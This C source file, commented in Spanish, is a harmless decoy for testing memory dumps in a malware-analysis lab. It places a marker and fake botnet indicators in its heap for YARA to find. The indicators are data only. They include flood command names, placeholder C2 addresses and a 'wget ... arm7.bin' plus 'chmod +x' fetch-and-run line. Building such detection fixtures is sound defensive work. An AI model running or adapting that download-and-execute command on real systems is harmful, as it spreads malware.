/*
 * senuelo_volcado.c — SEÑUELO BENIGNO DEDICADO A PROBAR EL VOLCADO DE MEMORIA
 * ==========================================================================
 *
 * Igual de inofensivo que los demás señuelos, pero diseñado para que el VOLCADO
 * de memoria SIEMPRE tenga algo que capturar. Resuelve el caso en que el dump
 * salía vacío porque la muestra moría antes:
 *
 *   - VIVE INDEFINIDAMENTE por defecto (bucle hasta que el analizador lo mate),
 *     así NUNCA se auto-termina antes del volcado  → descarta la "rama A"
 *     (proceso no vivo). Si aun así no hay dump, el problema es del VOLCADOR
 *     (procdump/gcore con `sudo -n`), no de la muestra.
 *   - UN SOLO PROCESO, sin fork/daemonizar → el seguimiento del PID es trivial.
 *   - Imprime su PID y un MARCADOR único, y deja en el HEAP un bloque grande con
 *     ese marcador repetido + los IOCs → fácil de hallar en el core aunque sea
 *     parcial.
 *
 * NO hace red, archivos, exec ni fork. Solo malloc + nanosleep + write.
 *
 * Uso:  ./senuelo_volcado          # vive hasta que lo maten (ideal para el lab)
 *       ./senuelo_volcado 30        # o acotado a 30 s
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

/* Marcador único e improbable: si aparece en el dump, el heap se capturó. */
#define MARCA "MAGIA_VOLCADO_SENUELO_7F454C46"

/* IOCs falsos (mismo set que senuelo_memoria) para disparar YARA en el volcado. */
static const char *const IOCS[] = {
    "=== INICIO_CONFIG_C2_SENUELO ===",
    "http://192.0.2.66/bins/arm7.bin",
    "203.0.113.5:1337",
    "c2.senuelo-lab.invalid",
    "PRIVMSG #control :",
    "UDPFLOOD", "HTTPFLOOD", "TCPFLOOD", "GETLOCALIP", "TSUNAMI",
    "/dev/watchdog", "/bin/busybox", "TSource Engine Query", "/proc/net/tcp",
    "/etc/rc.local", "/etc/cron.hourly/",
    "wget http://192.0.2.66/bins/arm7.bin", "chmod +x /tmp/.x",
    "=== FIN_CONFIG_C2_SENUELO ===",
};
#define N_IOCS (sizeof(IOCS) / sizeof(IOCS[0]))

int main(int argc, char **argv)
{
    /* 0 (por defecto) => vive indefinidamente; el analizador lo termina. */
    long segundos = (argc > 1) ? atol(argv[1]) : 0;

    /* Desempaca los IOCs al HEAP (memoria anónima => entra al core dump). */
    char **config = malloc(N_IOCS * sizeof(char *));
    for (size_t i = 0; i < N_IOCS; i++)
        config[i] = strdup(IOCS[i]);

    /* Bloque grande en HEAP con el marcador repetido: muy fácil de hallar. */
    size_t tam = 64 * 1024;
    char *marca = malloc(tam);
    marca[0] = '\0';
    while (strlen(marca) + sizeof(MARCA) < tam)
        strcat(marca, MARCA "_");

    printf("=== SENUELO DE VOLCADO (benigno) — PID=%d ===\n", getpid());
    printf("Marcador en heap: %s\n", MARCA);
    printf("%zu IOCs + bloque de %zu KB en heap. Vivo %s.\n",
           N_IOCS, tam / 1024,
           segundos > 0 ? "por tiempo dado" : "hasta que me maten (ideal para el volcado)");
    fflush(stdout);

    struct timespec un_segundo = {1, 0};
    for (long t = 0; segundos == 0 || t < segundos; t++) {
        nanosleep(&un_segundo, NULL);
        /* "tocar" el heap para que las páginas sigan residentes en RAM. */
        volatile char c = 0;
        for (size_t i = 0; i < N_IOCS; i++)
            c ^= config[i][0];
        c ^= marca[0];
        (void)c;
        printf("latido %ld (heap residente, sin actividad maliciosa)\n", t + 1);
        fflush(stdout);
    }

    /* No liberamos a propósito: queremos que el dump capture el heap. */
    return 0;
}
